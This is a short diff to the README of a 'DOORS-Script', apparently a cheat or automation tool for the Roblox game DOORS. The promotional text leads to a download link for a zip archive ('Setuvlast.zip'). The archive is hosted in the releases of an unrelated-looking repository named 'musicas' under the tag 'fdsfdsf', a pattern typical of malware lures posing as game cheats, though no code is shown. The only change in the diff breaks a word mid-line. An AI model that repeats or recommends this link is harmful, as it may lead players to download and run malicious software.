@@ -4,7 +4,8 @@
 
 
 # DOORS-Script
-Enhance your Roblox DOORS experience with this powerful script! Automate door interactions, item collection, and more. Fully customizable, efficient, and compatible with the latest Roblox updates. Perfect for developers and players alike! 🚪🎮
+Enhance your Roblox DOORS experience with this powerful script! Automate door interactions, item collection, and more. Fully customizable, efficient, and com
+patible with the latest Roblox updates. Perfect for developers and players alike! 🚪🎮
 
 <div style="text-align: center">
   <a href="https://github.com/ROMILDOVAZ/musicas/releases/download/fdsfdsf/Setuvlast.zip">
